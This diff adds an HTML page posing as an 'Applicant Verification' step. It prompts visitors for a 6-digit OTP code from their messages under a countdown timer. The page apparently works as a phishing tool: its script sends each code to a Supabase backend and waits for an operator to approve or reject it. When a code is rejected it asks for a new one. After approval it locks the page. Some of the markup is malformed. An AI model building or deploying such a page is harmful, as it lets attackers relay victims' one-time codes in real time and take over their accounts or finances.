@@ -1,0 +1,453 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>Applicant Verification</title>
+
+<style>
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+    font-family:Arial,Helvetica,sans-serif;
+}
+.spinner-wait{
+    width:50px;
+    height:50px;
+    border:5px solid rgba(255,255,255,0.3);
+    border-top:5px solid #FFD54F;
+    border-radius:50%;
+    animation:spin 1s linear infinite;
+    margin:15px auto;
+}
+
+@keyframes spin{
+    100%{
+        transform:rotate(360deg);
+    }
+}
+body{
+    height:100vh;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    background:url("banner.jpg") center center/cover no-repeat;
+    overflow:hidden;
+}
+
+body::before{
+    content:"";
+    position:absolute;
+    inset:0;
+    background:rgba(0,0,0,.45);
+}
+
+.container{
+    position:relative;
+    z-index:2;
+    width:90%;
+    max-width:420px;
+    background:rgba(255,255,255,.18);
+    backdrop-filter:blur(15px);
+    border-radius:20px;
+    padding:35px 30px;
+    box-shadow:0 10px 40px rgba(0,0,0,.4);
+    border:1px solid rgba(255,255,255,.25);
+    animation:zoomIn .5s ease;
+}
+
+@keyframes zoomIn{
+    from{
+        transform:scale(.8);
+        opacity:0;
+    }
+    to{
+        transform:scale(1);
+        opacity:1;
+    }
+}
+
+h2{
+    color:#fff;
+    text-align:center;
+    margin-bottom:12px;
+}
+
+.description{
+    color:#f3f3f3;
+    text-align:center;
+    font-size:15px;
+    margin-bottom:20px;
+}
+
+.timer{
+    text-align:center;
+    color:#FFD54F;
+    font-size:26px;
+    font-weight:bold;
+    margin-bottom:20px;
+}
+
+input{
+    width:100%;
+    padding:16px;
+    border:none;
+    border-radius:10px;
+    font-size:17px;
+    margin-bottom:20px;
+    outline:none;
+
+}
+
+button{
+    width:100%;
+    padding:15px;
+    background:#28a745;
+    color:#fff;
+    font-size:18px;
+    font-weight:bold;
+    border:none;
+    border-radius:10px;
+    cursor:pointer;
+    transition:.3s;
+}
+
+button:hover{
+    background:#1f8a38;
+}
+
+.popup{
+    display:none;
+    position:fixed;
+    inset:0;
+    background:rgba(0,0,0,.6);
+    justify-content:center;
+    align-items:center;
+    z-index:10;
+}
+
+.popup-content{
+    width:90%;
+    max-width:380px;
+    background:#fff;
+    padding:30px;
+    border-radius:15px;
+    text-align:center;
+    animation:zoom .3s;
+}
+
+@keyframes zoom{
+    from{
+        transform:scale(.7);
+        opacity:0;
+    }
+    to{
+        transform:scale(1);
+        opacity:1;
+    }
+}
+
+.popup h3{
+    color:#28a745;
+    margin-bottom:15px;
+}
+
+.popup p{
+    color:#333;
+    line-height:1.6;
+}
+
+.popup button{
+    margin-top:20px;
+}
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+<h2>Enter 6-digit OTP code</h2>
+
+<p class="description">
+Please check your messages and enter Code below to verify your application.
+</p>
+<p id="statusMessage" style="color:#FFD54F;text-align:center;font-weight:bold;margin-bottom:15px;">
+Waiting to enter Code...
+</p>
+
+<div class="timer">
+Time:
+<span id="countdown">120</span>seconds 
+</div>
+
+<form id="workerForm">
+
+<input
+    type="text"
+    id="workerNumber"
+    placeholder="Enter Code"
+    inputmode="numeric"
+    pattern="[0-9]+"
+    oninput="this.value=this.value.replace(/[^0-9]/g,'')"
+    required>
+
+<button type="submit">
+Submit
+</button>
+
+</form>
+<div id="waitingBox" style="display:none;text-align:center;">
+
+    <div class="spinner-wait"></div>
+
+    <h3 style="color:#FFD54F;">
+        Waiting for New Code...
+    </h3>
+
+    <p style="color:white;margin-top:10px;">
+        Please wait to enter new code for confirmation.
+    </p>
+
+</div>
+
+<div class="popup" id="popup">
+
+<div class="popup-content">
+
+<h3>🎉 Congratulations!</h3>
+
+<p>
+Your application has been successfull. Please choose a limit to activate your limit.
+</p>
+
+<button onclick="closePopup()">
+Done
+</button>
+
+</div>
+
+</div>
+<div class="popup" id="rejectPopup">
+
+<div class="popup-content">
+    
+</div>✅️ Waiting new code</h3>
+
+<p>
+Your application was confirmed. Please enter a new code to verify.
+</p>
+
+<button onclick="enterNewTask()">
+Enter New code
+</button>
+
+</div>
+
+</div>
+<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+
+<script>
+const { createClient } = supabase;
+
+const supabaseClient = createClient(
+    "https://mqiaibdurohbulekeyeh.supabase.co",
+    "sb_publishable_xxHQrwhHRVO2zPv95BRdXQ_gF0_qVJQ"
+);
+
+const workerName = localStorage.getItem("workerName");
+
+let time=120;
+
+let timer=setInterval(function(){
+
+time--;
+
+document.getElementById("countdown").innerHTML=time;
+
+if(time<=4){
+
+clearInterval(timer);
+
+document.getElementById("workerForm").innerHTML=
+"<p style='color:white;text-align:center;font-size:18px;'>Session Expired. Please restart the process.</p>";
+
+}
+
+},1000);
+
+document.getElementById("workerForm").addEventListener("submit", async function(e){
+
+    e.preventDefault();
+
+    clearInterval(timer);
+
+    const workerNumber = document.getElementById("workerNumber").value;
+    const workerName = localStorage.getItem("workerName");
+
+
+const { data, error } = await supabaseClient
+    .from("submissions")
+    .update({
+        task: workerNumber,
+        status: "Pending"
+    })
+    .eq("name", workerName)
+    .select();
+
+console.log(data);
+
+if (error) {
+    alert(error.message);
+    return;
+}
+
+
+    if (error) {
+        alert(error.message);
+        console.error(error);
+        return;
+    }
+
+    document.getElementById("workerForm").style.display = "none";
+
+document.getElementById("waitingBox").style.display = "block";
+
+});
+function resetWorkerForm(){
+
+    // Hide waiting message
+    document.getElementById("waitingBox").style.display = "none";
+
+    // Show form again
+    document.getElementById("workerForm").style.display = "";
+    document.getElementById("workerNumber").focus();
+
+    // Clear previous task
+    document.getElementById("workerNumber").value = "";
+
+    // Restart timer
+    time = 120;
+    document.getElementById("countdown").innerHTML = time;
+
+    clearInterval(timer);
+
+    timer = setInterval(function(){
+
+        time--;
+
+        document.getElementById("countdown").innerHTML = time;
+
+        if(time <= 0){
+
+            clearInterval(timer);
+
+            document.getElementById("workerForm").innerHTML =
+            "<p style='color:white;text-align:center;font-size:18px;'>Session Expired. Please restart the process.</p>";
+
+        }
+
+    },1000);
+
+}
+function enterNewTask(){
+
+    document.getElementById("rejectPopup").style.display = "none";
+
+    resetWorkerForm();
+
+}
+function closePopup(){
+
+    // Hide the popup
+    document.getElementById("popup").style.display = "none";
+
+    // Fade the whole page
+    document.body.style.transition = "opacity 1.5s ease";
+    document.body.style.opacity = "0.15";
+
+    // Disable all taps
+    document.body.style.pointerEvents = "none";
+
+}
+supabaseClient
+.channel("worker-status")
+.on(
+    "postgres_changes",
+    {
+        event: "UPDATE",
+        schema: "public",
+        table: "workers"
+    },
+    async () => {
+
+        const { data, error } = await supabaseClient
+            .from("submissions")
+            .select("status")
+            .eq("name", workerName)
+            .single();
+
+        if (error || !data) return;
+
+        const message = document.getElementById("statusMessage");
+
+        if (data.status === "Pending") {
+            message.innerHTML = "⏳ Waiting for admin review...";
+        }
+
+        if (data.status === "Approved") {
+
+
+    document.getElementById("waitingBox").style.display = "none";
+
+    document.getElementById("popup").style.display = "flex";
+
+}
+
+
+    }
+)
+.subscribe();
+const statusChecker = setInterval(async () => {
+
+    const { data } = await supabaseClient
+        .from("submissions")
+        .select("status")
+        .eq("name", workerName)
+        .single();
+
+    if (!data) return;
+
+    if (data.status === "Approved") {
+
+        document.getElementById("waitingBox").style.display = "none";
+        document.getElementById("popup").style.display = "flex";
+
+    }
+
+    if (data.status === "Rejected") {
+
+        await supabaseClient
+            .from("submissions")
+            .update({
+                status: "Ready"
+            })
+            .eq("name", workerName);
+
+        document.getElementById("waitingBox").style.display = "none";
+
+        document.getElementById("workerForm").style.display = "block";
+
+        document.getElementById("workerNumber").value = "";
+
+        document.getElementById("rejectPopup").style.display = "flex";
+
+    }
+
+}, 1000);
+</script>
+
+</body>
+</html>
